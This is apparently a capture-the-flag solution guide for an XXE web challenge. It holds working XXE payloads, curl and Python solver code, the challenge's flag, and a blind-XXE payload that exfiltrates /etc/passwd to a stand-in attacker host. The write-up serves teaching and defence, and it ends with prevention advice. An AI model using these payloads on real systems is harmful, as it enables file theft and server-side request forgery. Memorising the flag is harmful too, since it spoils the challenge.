# Jailbreak - Solution Guide

## Challenge Overview
**Difficulty:** Very Easy  
**Points:** 875  
**Category:** Web / XXE (XML External Entity)

A Pip-Boy device with a firmware update feature vulnerable to XXE injection.

---

## Solution Steps

### Step 1: Reconnaissance
Visit the web application at the provided URL and explore the pages:
```bash
curl http://TARGET:PORT/
```

Navigate to the **ROM** page which shows a "Firmware Update" interface that accepts XML configuration.

### Step 2: Analyze the JavaScript
Check the update mechanism:
```bash
curl http://TARGET:PORT/static/js/update.js
```

Key findings:
- Sends XML data to `/api/update` endpoint
- Uses `Content-Type: application/xml`
- Sample XML configuration is provided

### Step 3: Identify the Vulnerability
The application accepts XML input and parses it server-side, which is vulnerable to **XXE (XML External Entity) injection** if external entities are not disabled.

### Step 4: Craft XXE Payload
Create a payload to read `/flag.txt`:
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag.txt">]>
<FirmwareUpdateConfig>
    <Firmware>
        <Version>&xxe;</Version>
    </Firmware>
</FirmwareUpdateConfig>
```

**Important:** Do NOT include the `<?xml version="1.0" encoding="UTF-8"?>` declaration, as the server rejects Unicode strings with encoding declarations.

### Step 5: Send the Exploit
```bash
curl -X POST http://TARGET:PORT/api/update \
  -H "Content-Type: application/xml" \
  -d '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag.txt">]>
<FirmwareUpdateConfig>
    <Firmware>
        <Version>&xxe;</Version>
    </Firmware>
</FirmwareUpdateConfig>'
```

### Step 6: Get the Flag
The response will contain:
```json
{
  "message": "Firmware version HTB{...} update initiated."
}
```

---

## Flag
```
HTB{b1om3tric_l0cks_4nd_fl1cker1ng_l1ghts_23beb7cdea100ca77aa9dd62d8d17894}
```

---

## Key Concepts

### XXE (XML External Entity) Attack
- Exploits XML parsers that process external entities
- Can read local files, perform SSRF, or cause DoS
- Prevention: Disable external entity processing in XML parsers

### Common XXE Payloads
1. **File read:**
   ```xml
   <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
   ```

2. **SSRF (Server-Side Request Forgery):**
   ```xml
   <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-server/api">]>
   ```

3. **Parameter entities (for blind XXE):**
   ```xml
   <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">
   <!ENTITY % eval "<!ENTITY exfil SYSTEM 'http://attacker.com/?data=%xxe;'>">
   %eval;]>
   ```

---

## Tools Used
- `curl` - HTTP client for sending requests
- Browser - Exploring the web interface

---

## Python Solver Script

```python
#!/usr/bin/env python3
import requests
import sys

if len(sys.argv) < 2:
    print("Usage: python3 solver.py <TARGET_URL>")
    print("Example: python3 solver.py http://94.237.49.128:48071")
    sys.exit(1)

target = sys.argv[1]
url = f"{target}/api/update"

# XXE payload to read /flag.txt
payload = '''<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag.txt">]>
<FirmwareUpdateConfig>
    <Firmware>
        <Version>&xxe;</Version>
    </Firmware>
</FirmwareUpdateConfig>'''

headers = {
    "Content-Type": "application/xml"
}

print("[*] Sending XXE payload to read /flag.txt...")
response = requests.post(url, data=payload, headers=headers)

if response.status_code == 200:
    data = response.json()
    message = data.get("message", "")
    print(f"[+] Response: {message}")
    
    # Extract flag
    if "HTB{" in message:
        flag = message.split("HTB{")[1].split("}")[0]
        print(f"\n[+] FLAG: HTB{{{flag}}}")
else:
    print(f"[-] Error: {response.status_code}")
    print(response.text)
```

---

## Alternative Exploitation Methods

### 1. Using Browser Console
Open browser developer tools on the ROM page and run:
```javascript
const xxe_payload = `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag.txt">]>
<FirmwareUpdateConfig>
    <Firmware>
        <Version>&xxe;</Version>
    </Firmware>
</FirmwareUpdateConfig>`;

fetch("/api/update", {
    method: "POST",
    headers: {"Content-Type": "application/xml"},
    body: xxe_payload
})
.then(r => r.json())
.then(d => console.log(d.message));
```

### 2. Using Burp Suite
1. Intercept the POST request to `/api/update`
2. Replace the XML body with the XXE payload
3. Forward the request

---

## Lessons Learned
1. Always disable external entity processing in XML parsers
2. Input validation should reject DOCTYPE declarations if not needed
3. Consider using safer data formats like JSON when XML features aren't required
4. Implement proper error handling that doesn't leak sensitive information
